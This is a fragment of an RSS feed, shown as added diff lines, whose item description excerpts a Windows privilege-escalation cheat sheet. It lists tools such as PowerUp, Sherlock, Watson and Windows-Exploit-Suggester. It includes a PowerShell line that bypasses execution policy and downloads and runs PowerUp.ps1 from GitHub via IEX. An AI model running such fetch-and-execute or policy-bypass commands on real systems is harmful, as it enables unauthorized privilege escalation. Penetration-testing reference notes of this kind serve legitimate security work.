+      <description>Windows - Privilege Escalation # Tools # PowerSploit&amp;rsquo;s PowerUp powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&amp;#39;); Invoke-AllChecks Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock (Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1 BeRoot - Privilege Escalation Project - Windows / Linux / Mac Windows-Exploit-Suggester ./windows-exploit-suggester.py --update .</description>
+    </item>
+    
+  </channel>
+</rss>
